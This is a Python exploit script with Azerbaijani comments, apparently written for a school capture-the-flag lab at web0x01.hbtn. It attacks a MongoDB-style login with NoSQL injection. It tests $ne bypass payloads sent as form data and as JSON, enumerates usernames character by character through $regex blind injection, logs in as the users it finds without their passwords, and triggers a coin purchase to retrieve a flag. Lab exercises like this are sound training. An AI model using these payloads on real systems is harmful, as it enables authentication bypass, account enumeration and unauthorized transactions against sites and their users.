import requests
import string
import json
from bs4 import BeautifulSoup

# Hədəf URL
url = "http://web0x01.hbtn/a3/nosql_injection"
s = requests.Session()

def check_vulnerability_type():
    """
    Serverin hansı tip inyeksiyanı qəbul etdiyini (Form-data vs JSON)
    və uğurlu girişin necə göründüyünü təyin edir.
    """
    print("[*] Serverin davranışını analiz edirik...")

    # 1. Normal uğursuz giriş cəhdi (Baseline)
    bad_resp = s.post(url, data={"username": "bu_istifadeci_yoxdur_123", "password": "123"}, allow_redirects=True)
    bad_len = len(bad_resp.text)
    bad_url = bad_resp.url
    print(f"[-] Uğursuz giriş uzunluğu: {bad_len}, URL: {bad_url}")

    # 2. Form-Data ilə Bypass Cəhdi (PHP tərzi)
    form_payload = {"username[$ne]": "", "password[$ne]": ""}
    form_resp = s.post(url, data=form_payload, allow_redirects=True)
    
    # 3. JSON ilə Bypass Cəhdi (Python/NodeJS tərzi)
    json_payload = {"username": {"$ne": ""}, "password": {"$ne": ""}}
    json_resp = s.post(url, json=json_payload, allow_redirects=True)

    # Nəticəni yoxlayaq
    if form_resp.url != url or len(form_resp.text) != bad_len:
        print("[+] FORM-DATA inyeksiyası işlədi!")
        return "form", bad_len, bad_url
    elif json_resp.url != url or len(json_resp.text) != bad_len:
        print("[+] JSON inyeksiyası işlədi!")
        return "json", bad_len, bad_url
    else:
        print("[!] Təəssüf ki, hər iki bypass metodu uğursuz oldu. URL-i yoxlayın.")
        exit()

def get_usernames(method, bad_len, bad_url):
    print("\n[*] İstifadəçi adları axtarılır (Enumerating)...")
    found_usernames = []
    
    # Sadəlik üçün əvvəlcə ilk hərfləri yoxlayaq, sonra dərinə gedək
    # Əgər 'admin' tapsaq dayanmayaq, başqalarını da axtaraq
    chars = string.ascii_letters + string.digits
    
    # Recursive funksiya ilə axtarış
    def search(prefix):
        found_any = False
        for char in chars:
            current_test = prefix + char
            
            # Methoda uyğun payload hazırlayaq
            if method == "form":
                payload = {
                    "username[$regex]": f"^{current_test}",
                    "password[$ne]": ""
                }
                r = s.post(url, data=payload, allow_redirects=True)
            else: # json
                payload = {
                    "username": {"$regex": f"^{current_test}"},
                    "password": {"$ne": ""}
                }
                r = s.post(url, json=payload, allow_redirects=True)
            
            # Yoxlama şərti: URL dəyişibsə və ya məzmun fərqlidirsə
            if r.url != bad_url or len(r.text) != bad_len:
                # Dəqiq tapdıqmı yoxsa sadəcə başlanğıcdır?
                # Bunu yoxlamaq üçün "$" sonluq işarəsi ilə yoxlaya bilərik,
                # amma sadəlik üçün davam edək.
                print(f"[+] Tapılan hissə: {current_test}")
                
                # Bəlkə bu tam addır?
                # Tam ad olduğunu yoxlamaq üçün regex-siz (birbaşa adla) yoxlayaq
                if check_exact_user(current_test, method, bad_len):
                    print(f"FAILED! => TAM İSTİFADƏÇİ ADI TAPILDI: {current_test}")
                    found_usernames.append(current_test)
                    # Həmin istifadəçini yoxlayaq (Balans)
                    if check_balance_and_buy(current_test, method):
                        return True # Flag tapıldı, çıxış et
                
                # Axtarışa davam (daha uzun adlar üçün)
                if search(current_test):
                    return True
                found_any = True
                
        return False

    search("")
    return found_usernames

def check_exact_user(username, method, bad_len):
    """Bu istifadəçi adının tam olub olmadığını yoxlayır"""
    if method == "form":
        payload = {"username": username, "password[$ne]": ""}
        r = s.post(url, data=payload, allow_redirects=True)
    else:
        payload = {"username": username, "password": {"$ne": ""}}
        r = s.post(url, json=payload, allow_redirects=True)
        
    return len(r.text) != bad_len

def check_balance_and_buy(username, method):
    print(f"[*] '{username}' balans yoxlanılır...")
    # Login oluruq
    if method == "form":
        s.post(url, data={"username": username, "password[$ne]": ""})
    else:
        s.post(url, json={"username": username, "password": {"$ne": ""}})
        
    # Mübadilə edirik
    r = s.post(url, data={"coin": "HBTNc", "amount": "1"})
    
    if "Flag" in r.text or "HBTN" in r.text:
        print("\n" + "="*40)
        print("SUCCESS! FLAG TAPILDI:")
        for line in r.text.split('\n'):
            if "Flag" in line or "flag" in line:
                print(line.strip())
                with open("7-flag.txt", "w") as f:
                    f.write(line.strip())
        print("="*40 + "\n")
        return True
    return False

if __name__ == "__main__":
    try:
        # 1. Metodu təyin et
        method_type, b_len, b_url = check_vulnerability_type()
        
        # 2. Axtarışa başla
        get_usernames(method_type, b_len, b_url)
            
    except Exception as e:
        print(f"[!] Xəta: {e}")
